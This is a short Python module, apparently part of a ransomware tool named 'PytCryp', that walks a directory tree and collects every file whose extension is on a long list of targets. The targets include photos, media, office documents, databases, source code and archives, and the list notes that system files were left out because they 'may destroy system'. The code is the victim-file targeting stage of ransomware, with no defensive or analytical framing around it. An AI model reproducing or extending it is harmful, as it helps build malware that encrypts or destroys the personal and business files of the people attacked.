#!/usr/bin/env python
import os

class Discover(object):
    def __init__(self, startPath):
        self.startPath = startPath
        self.extensions = [
            # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
            'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

            'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
            'yml', 'yaml', 'json', 'xml', 'csv', # structured data
            'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
            'java', 'class', 'jar', # java source code
            'ps', 'bat', 'vb', # windows based scripts
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
            'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
            'pcrp', # PytCryp
        ]


    def __start__(self):
        for dirPath, directories, files in os.walk(self.startPath):
            for _file in files:
                absolutePath = os.path.abspath(os.path.join(dirPath, _file))
                ext = absolutePath.split('.')[-1]
                if ext in self.extensions:
                    yield absolutePath

